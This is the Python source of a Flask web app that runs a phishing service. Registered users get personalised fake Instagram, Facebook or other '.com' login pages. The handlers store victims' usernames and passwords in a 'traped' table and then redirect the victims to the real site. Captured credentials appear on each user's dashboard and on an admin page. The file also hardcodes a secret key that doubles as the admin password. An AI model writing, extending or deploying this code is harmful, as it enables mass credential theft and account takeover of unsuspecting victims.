from flask import Flask,render_template,request,redirect,session,flash
import DBHelper as dbh

app = Flask(__name__)


app.secret_key="mynameisheera"

dbh.init_db()


#completed
@app.route("/")
def home():
    if 'user' in session:
        return render_template("home.html",uid=session['user'],isLogged=True)
    return render_template("home.html")




#completed
@app.route("/register",methods=['POST','GET'])
def register():
    if request.method=='POST':
        uid=request.form.get("username")
        
        if not dbh.check_if_user_exists(uid):
            email=request.form.get("email")
            pas=request.form.get("psw")
            print(uid,email,pas)
            dbh.insert_into_user(uid,email,pas)
            session['user']=uid
            return redirect("/")
        else:
            return render_template("register.html",userAlreadyExists=True)
        
    else:
        return render_template("register.html")




#completed
@app.route("/login",methods=['POST','GET'])
def login():
    if request.method=='POST':
        username=request.form.get('username')
        password=request.form.get('password')
        #for ADMIN
        if username=='admin' and password=='mynameisheera':
            session['admin']="admin"
            print(username,"logged in admin")
            return redirect('/admin')
        elif dbh.check_user_credential(username,password):
            session['user']=username
            print(username,"logged in")
            return redirect('/')
        
        else:
            return render_template("login.html",wrongDetail=True)
    return render_template("login.html")




#completed
@app.route('/logout')
def logout():
    if 'user' in session:
         session.pop('user')
    if 'admin' in session:
        session.pop('admin')
    return redirect('/')




#Completed
@app.route("/apps")
def apps():
    if 'user' in session:
        return render_template("/apps.html",isLogged=True,uid=session['user'])
    return render_template("login.html",isLogged=False)




#completed
@app.route('/dashboard')
def dashboard():
    if 'user' in session :
        return render_template("dashboard.html",data=dbh.get_traped_data_for_owner(session['user']),isLogged=True,uid=session['user'])
    return render_template("login.html",isLogged=False)




#completed
@app.route('/contactus',methods=['GET','POST'])
def contactus():
    if request.method=='POST':
        uid="None"
        if 'user' in session:
            uid=session['user']
        name=request.form.get('yname')
        email=request.form.get('yemail')
        msg=request.form.get('ymessage')
        print(uid,name,email,msg)
        dbh.save_feedback(uid,name,email,msg)
        return redirect('/')
    return render_template('contactus.html')





#completed
@app.errorhandler(404)
def page_not_found(error):
    return render_template('page_not_found.html'), 404




#.........INSTAGRAM.........

#for looking demo
# @app.route("/instagram.com")
# def insta():
#     return render_template("/apps/insta.html")

# #completed
# @app.route("/<userid>/instagram.com")
# def InstaPhishingPage(userid):
#     if dbh.check_if_user_exists(userid):
#         return render_template("apps/insta.html",uid=userid)
#     return render_template('page_not_found.html')


# #completed
# @app.route("/loginInsta",methods=['POST'])
# def loginInsta():
#     owner=request.form.get('owner')
#     if owner=="":
#         pass
#     else:
#         site=request.form.get('app')
#         uid=request.form.get('uid')
#         pas=request.form.get('pas')
#         dbh.insert_into_traped(owner,site,uid,pas)
#         print(owner,site,uid,pas)
#     return redirect("https://instagram.com")

# #..........END.......



# #..........FACEBOOK...........

# #for looking demo
# @app.route("/facebook.com")
# def facebook():
#     return render_template("/apps/facebook.html")

# #completed
# @app.route("/<userid>/facebook.com")
# def FacebookPhishingPage(userid):
#     if dbh.check_if_user_exists(userid):
#         return render_template("apps/facebook.html",uid=userid)
#     return render_template('page_not_found.html')

# #completed
# @app.route("/loginFacebook",methods=['POST'])
# def loginFacebook():
#     owner=request.form.get('owner')
#     if owner=="":
#         pass
#     else:
#         site=request.form.get('app')
#         uid=request.form.get('uid')
#         pas=request.form.get('pas')
#         dbh.insert_into_traped(owner,site,uid,pas)
#         print(owner,site,uid,pas)
#     return redirect("https://facebook.com")


#......FACEBOOK END.......




@app.route("/<appname>.com")
def phishing_demo(appname):
    try:
        return render_template(f"/apps/{appname}.html")
    except:
        return render_template('page_not_found.html')

@app.route("/<userid>/<appname>.com")
def phishing_page(appname, userid):
    if dbh.check_if_user_exists(userid):
        try:
            return render_template(f"apps/{appname}.html", uid=userid)
        except:
            return render_template('page_not_found.html')
    return render_template('page_not_found.html')

@app.route("/login<appname>", methods=['POST'])
def login_phishing(appname):
    owner = request.form.get('owner')
    if owner:
        site = request.form.get('app')  # or just use appname directly
        uid = request.form.get('uid')
        pas = request.form.get('pas')
        dbh.insert_into_traped(owner, site, uid, pas)
    return redirect(f"https://{appname}.com")




#.............ADMIN PAGE............................
@app.route("/admin")
def admin():
    if 'admin' in session:
        users = dbh.get_user_data()
        traps = dbh.get_traped_data()
        feedback = dbh.get_feedback_data()

        return render_template("ADMIN.html",
                               uid=session['admin'],
                               users=users,
                               traps=traps,
                               feedback=feedback)
    return render_template("login.html", isLogged=False)





#for admin
# @app.route("/delete")
# def deleteDATABASE():
#     dbh.deleteAll()
#     return "deleted"
